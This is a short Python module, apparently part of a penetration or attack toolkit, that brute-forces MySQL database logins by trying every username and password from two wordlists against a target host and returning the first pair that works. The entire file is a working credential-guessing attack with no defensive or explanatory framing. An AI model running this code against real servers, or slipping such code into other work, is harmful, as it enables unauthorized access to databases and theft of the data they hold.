import pymysql

def run(target, port, usernames_path="wordlists/port_users.txt", passwords_path="wordlists/port_pw.txt"):
	try:
		with open(usernames_path, "r") as f:
			usernames = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "username": None, "password": None, "error": "Username file not found"}

	try:
		with open(passwords_path, "r") as f:
			passwords = [line.strip() for line in f if line.strip()]
	except FileNotFoundError:
		return {"success": False, "username": None, "password": None, "error": "Password file not found"}

	for user in usernames:
		for pw in passwords:
			try:
				conn = pymysql.connect(host=target, port=port, user=user, password=pw, connect_timeout=5)
				#print(f"Success! {user}:{pw}")
				conn.close()
				return {"success": True, "username": user, "password": pw}
			except pymysql.err.OperationalError as e:
				pass
				# 1045 is access denied, others might be different errors
			except Exception as e:
				pass
				#print(f"Error: {e}")
	#print("Brute-force failed.")
	return {"success": False, "username": None, "password": None, "error": "Brute-force failed"}
